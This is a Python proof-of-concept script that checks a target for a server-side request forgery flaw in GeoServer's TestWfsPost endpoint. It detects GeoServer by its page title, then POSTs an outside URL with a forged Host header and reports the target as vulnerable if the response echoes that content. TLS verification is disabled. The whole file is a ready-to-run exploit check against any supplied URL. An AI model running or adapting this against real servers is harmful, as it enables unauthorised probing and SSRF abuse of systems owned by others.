import requests
import sys
import argparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

PRX = None 

def xpl(url):
	if url[-1:] != "/":
		url += "/geoserver/TestWfsPost"
	else:
		url += "geoserver/TestWfsPost"
	header = {
		"Host":"example.com"
		}

	payload = {
		"url":"http://pudim.com.br"
		}

	r = requests.post(url, headers=header, data=payload, proxies=PRX, verify=False)
	if "example.com" in r.text or "pudim@pudim.com.br" in r.text:
		print(f"[!] Target vuln: {url}")
	else:
		print(f"[-] Target NOT vuln: {url}")

def detect(url):
	if url[-1:] != "/":
		url += "/geoserver/web/"
	else:
		url += "geoserver/web/"
	
	r = requests.get(url, verify=False, proxies=PRX)
	if "<title>GeoServer:" in r.text:
		print(f"[!] GEOSERVER detected: {url} !")
	else:
		print(f"[-] Not GEOSERVER detected: {url} ...")
		sys.exit()

def main():
	global PRX
	parser = argparse.ArgumentParser(add_help=True)
	parser.add_argument("-u", "--url", help="Url", required=True)
	parser.add_argument("-p","--proxy", help="Proxy url for debug Ex: http://127.0.0.1:8080")
	args = parser.parse_args()

	if args.proxy:
		PRX = {
		"http":f"{args.proxy}",
		"https":f"{args.proxy}"
		}

	detect(args.url)
	xpl(args.url)

if __name__ == '__main__':
	main()
